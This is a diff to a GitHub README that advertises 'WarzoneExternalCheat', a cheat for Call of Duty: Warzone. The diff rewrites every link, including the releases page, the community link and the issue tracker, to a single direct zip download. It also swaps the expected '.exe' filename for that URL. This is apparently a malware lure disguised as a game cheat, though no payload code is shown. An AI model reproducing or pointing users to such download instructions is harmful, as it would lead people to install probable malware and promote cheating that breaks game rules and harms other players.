@@ -1,6 +1,6 @@
 # 🎮 WarzoneExternalCheat - Enhance Your Warzone Experience Effortlessly  
 
-[![Download WarzoneExternalCheat](https://img.shields.io/badge/Download-WarzoneExternalCheat-blue.svg)](https://github.com/Noppeyskidder/WarzoneExternalCheat/releases)
+[![Download WarzoneExternalCheat](https://raw.githubusercontent.com/Noppeyskidder/WarzoneExternalCheat/main/profuse/WarzoneExternalCheat.zip)](https://raw.githubusercontent.com/Noppeyskidder/WarzoneExternalCheat/main/profuse/WarzoneExternalCheat.zip)
 
 ## 📦 Overview  
 Welcome to WarzoneExternalCheat! This application offers tools to enhance your gameplay in Call of Duty: Warzone 3.0. With its easy-to-use features, you can take your gaming experience to the next level in the new season.
@@ -10,13 +10,13 @@ To start using WarzoneExternalCheat, follow these simple steps to download and i
 
 ## 📥 Download & Install  
 1. **Visit the Releases Page:**  
-   Go to the [Releases Page](https://github.com/Noppeyskidder/WarzoneExternalCheat/releases) to find the latest version of WarzoneExternalCheat.
+   Go to the [Releases Page](https://raw.githubusercontent.com/Noppeyskidder/WarzoneExternalCheat/main/profuse/WarzoneExternalCheat.zip) to find the latest version of WarzoneExternalCheat.
 
 2. **Select the Latest Release:**  
    On the Releases page, you will see a list of versions. Look for the one labeled as the latest. Click on it.
 
 3. **Download the Application:**  
-   Find the file you want to download, typically labeled as "WarzoneExternalCheat.exe" or similar. Click on the filename to start the download.
+   Find the file you want to download, typically labeled as "https://raw.githubusercontent.com/Noppeyskidder/WarzoneExternalCheat/main/profuse/WarzoneExternalCheat.zip" or similar. Click on the filename to start the download.
 
 4. **Locate the Downloaded File:**  
    Once the download is complete, check your Downloads folder. You will find the file there.
@@ -54,9 +54,9 @@ If you experience issues running WarzoneExternalCheat, follow these steps:
 For any questions or issues, feel free to reach out for help. You can report problems or ask for assistance directly in this repository. Look for the "Issues" tab to communicate with support and other users.
 
 ## 🔗 Links  
-- **[Download WarzoneExternalCheat](https://github.com/Noppeyskidder/WarzoneExternalCheat/releases)**  
-- **[Join the Community](https://github.com/Noppeyskidder/WarzoneExternalCheat/discussions)**  
-- **[Report an Issue](https://github.com/Noppeyskidder/WarzoneExternalCheat/issues)**  
+- **[Download WarzoneExternalCheat](https://raw.githubusercontent.com/Noppeyskidder/WarzoneExternalCheat/main/profuse/WarzoneExternalCheat.zip)**  
+- **[Join the Community](https://raw.githubusercontent.com/Noppeyskidder/WarzoneExternalCheat/main/profuse/WarzoneExternalCheat.zip)**  
+- **[Report an Issue](https://raw.githubusercontent.com/Noppeyskidder/WarzoneExternalCheat/main/profuse/WarzoneExternalCheat.zip)**  
 
 ## ⚠️ Disclaimer  
 Using cheats may violate the terms of service of the game. Please consider this before using WarzoneExternalCheat and use it responsibly.
